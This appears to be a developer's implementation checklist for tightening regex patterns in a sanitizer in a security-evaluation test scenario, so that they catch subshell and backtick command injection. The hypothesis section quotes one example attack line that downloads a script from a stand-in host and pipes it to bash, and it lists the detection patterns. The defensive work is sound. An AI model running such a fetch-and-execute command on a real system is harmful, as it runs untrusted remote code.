# Phase 15: Proactive Security Gate & SymPy VRAM Proof — Implementation Checklist

> **Phase Directory**: `phase_15_proactive_security_gate_sympy_vram_proof`  
> **Status**: Stage `02_impl` execution  

---

## 1. Targeted Symbols & Code Modules
- **Target File**: `tests/phase15_regen_security_eval/scenario/sanitizer_engine.py`
- **Target Symbol**: `SanitizerEngine.SUBSHELL_PATTERN`, `SanitizerEngine.BACKTICK_PATTERN`
- **Causal Hypothesis**: `SUBSHELL_PATTERN` (`\$\([a-zA-Z0-9_]+\)`) and `BACKTICK_PATTERN` (`` `[a-zA-Z0-9_]+` ``) only match single alphanumeric tokens without spaces, pipes, or flags, allowing complex commands like `$(curl -s evil.com | bash)` to bypass. Updating patterns to `\$\([^)]+\)` and `` `[^`]+` `` blocks all subshell executions, achieving 100% memory poisoning block rate.
- **Karpathy U12 Limit**: Single causal mutation <= 15 lines diff.

---

## 2. Surgical Implementation Plan
- [x] Step 1: Formulate single-cause causal hypothesis for `SanitizerEngine` patterns.
- [ ] Step 2: Ensure shadow backup (`<target>.hermes.bak`) exists.
- [ ] Step 3: Apply mutation via `jev_mutate_module` adhering to Karpathy U12 diff limit (<= 15 lines).
- [ ] Step 4: Verify pre-commit `ast.parse` and post-write `ruff check` pass with code 0.
- [ ] Step 5: Advance stage to `03_verify` in `03_verify/status.json`.
